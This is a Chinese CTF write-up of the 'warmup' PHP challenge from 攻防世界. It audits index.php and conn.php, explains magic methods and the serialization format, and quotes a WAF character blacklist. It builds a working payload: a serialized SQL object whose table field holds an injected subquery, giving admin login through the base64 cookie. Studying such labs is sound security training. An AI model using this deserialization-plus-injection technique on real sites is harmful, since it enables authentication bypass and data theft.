# warmup WP  （反序列化）

题目来源：攻防世界

题目提供了一个网址和一个下载附件

用虚拟机打开：

![image-20251220135655041](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220135655041.png)

三个文件conn.php index.php ip.php

我存储在vscode中

登录界面：

<img src="C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220140126302.png" alt="image-20251220140126302" style="zoom: 50%;" />

先 `dirsearch` 一下有没有隐藏的路径

![image-20251220140806969](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220140806969.png)

有一个flag.php,虽然是200，但是访问无返回。

再抓包一下登录请求，看一下有没有SQL注入

再代码审计一下那三段代码

**在index.php中有反序列化的描述：**

```php
<?php
include 'conn.php';
include 'flag.php';

//isset() 函数：是否返回为空：判断cookie是否存在
if (isset ($_COOKIE['last_login_info'])) {
    //unserialize()反序列化函数：把字符串直接变成PHP变量 
    //base64_decode()把“可显示字符串”还原成“原始序列化字符串”
    $last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info']));
    //这里的try，catch没有啥用，因为unserialize()不会抛出异常
    try {
        //数组 + IP不同 被拦
        //数组 + IP相同 放行
        //不是数组（比如对象） 放行
        if (is_array($last_login_info) && $last_login_info['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('WAF info: your ip status has been changed, you are dangrous.');
        }
    } catch(Exception $e) {
        die('Error');
    }
    
    
    //没有cookie的时候，系统会自动生成一个：
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('last_login_info', $cookie, time () + (86400 * 30));
}
//这一步告诉我们cookie的正确格式


```

##### `unserialize()` 可能得到的东西是：

> - array
> - string
> - int
> - object（对象）
>
> 而且没有任何的限制。



检查request中的cookie，尝试解码：

```
Cookie: last_login_info=YToxOntzOjI6ImlwIjtzOjEzOiIxODMuMjQ3LjguMjIwIjt9
解码：a:1:{s:2:"ip";s:13:"183.247.8.220";}
```

#### **这一步，这一个文件，让我们确定反序列化入口和格式**



##### `index.php` 中调用逻辑：

```php

if(isset($_POST['username']) && isset($_POST['password'])){
        $table = 'users';
        //addslashes()函数的作用就是在一些字符前加\，破坏SQL语义
        $username = addslashes($_POST['username']);
        $password = addslashes($_POST['password']);
        $sql = new SQL();
        $sql->connect();  //连接数据库
    //赋值
        $sql->table = $table;
    $sql->username = $username;
    $sql->password = $password;
    $sql->check_login();
}
```



基本确定本题是反序列化+SQL的考点：
那么我们在看 `conn.php` 文件，确定反序列化的流程：

> #### PHP在反序列化对象的时候，做了以下几件事：
>
> 当PHP执行：
>
> ```
> unserialize($str);
> ```
>
> 并且 `$str` 是个对象，PHP就会严格按这个顺序做：
>
> 1. 创建对象实例（不调用`_construct`）
> 2. 恢复对象的属性值
> 3. 如果类中存在 `_wakeup()` ，自动调用它
>
> 注意：
>
> - `_construct()` 不会被调用
> - `_wakeup()` 一定会被调用
>
> #### 其他的魔术方法：
>
> | 魔术方法       | 什么时候调用         |
> | -------------- | -------------------- |
> | `_construct()` | `new` 对象时         |
> | `_destruct()`  | 对象销毁时           |
> | `_wakeup()`    | `unseialize` 时      |
> | `_sleep()`     | `serialize` 时       |
> | `_tostring()`  | 当对象被当作字符串用 |
> | `_call()`      | 调用不存在的方法时   |
>
> #### 反序列化的头部格式：
>
> 反序列的格式是公开的，固定，可读的：
>
> | 类型   | 标识                               |
> | ------ | ---------------------------------- |
> | NULL   | `N;`                               |
> | int    | `i:1;`                             |
> | string | `s:5:"admin";`                     |
> | array  | `a:1:{...}`                        |
> | object | `O:类名长度:"类名":属性数量:{...}` |
>
> 



##### 总览流程：

```
unserialize(用户数据)
PHP发现时SQL对象
自动调用_wakeup()
_wakeup()内部：
	connect()
	waf()
	check_login()
		query()
			waf()
			mysqli_query()
			
理解：
首先if (isset ($_COOKIE['last_login_info'])) {
这是入口，这里过了的话就会调用wakeup,wakeup首先是连接了数据库，其次过一遍waf,过了之后就会check_login，而在check_login中会调用query,这也是最重要的，这里query又会指向一次waf，这个过了之后，就会返回conn->query，再回到check_login,根据返回的值，经过if语句，出现flag，也就是说我构建的payload，必须得绕过两个waf,并且能过if(username=admin)
```

##### 所以构建payload的条件：

1. 能被unserialize成SQL对象

   之前提到的只有对象才会触发魔术方法，只有SQL类定义了 `_wakeup()`方法

2. 两次 `waf()` 不能die

   ```php
   public function waf(){
           $blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":", ";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\", "]" , "*", "+", "-"];
           foreach ($blacklist as $value) {
                   if(strripos($this->table, $value)){
                           die('bad hacker,go out!');
                   }
           }
           foreach ($blacklist as $value) {
               if(strripos($this->username, $value)){
                   die('bad hacker,go out!');
               }
           }
           foreach ($blacklist as $value) {
               if(strripos($this->password, $value)){
                   die('bad hacker,go out!');
               }
           }
       }
   ```

   

3. SQL能够成功指向

   ```php
   public function query() {
           $this->waf();
           return $this->conn->query ("select username,password from ".$this->table." where username='".$this->username."' and password='".$this->password."'");
       }
   ```

   

4. 第一条记录的username必须是 `admin`

   ```php
   public function check_login(){
           $result = $this->query();
           if ($result === false) {
               die("database error, please check your input");
           }
           $row = $result->fetch_assoc();
           if($row === NULL){
               die("username or password incorrect!");
           }else if($row['username'] === 'admin'){
               $flag = file_get_contents('flag.php');
               echo "welcome, admin! this is your flag -> ".$flag;
           }else{
               echo "welcome! but you are not admin";
           }
           $result->free();
       }
   ```

所以构建payload：

```php
<?php
    class SQL{
    	public $table;
    	public $username;
   		public $password;
    	//public $conn;
	}
	$o=new SQL();
//a是SQL的表别名，强制语法，意思是，把这一行假数据，当成一张临时表，名字叫做a
	$o->table="(select 'admin' username,'123' password)a";
	$o->username='admin';
	$o->password='123';
	echo base64_encode(serialize($o));
```

最后得到flag：

![image-20251220164713388](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220164713388.png)

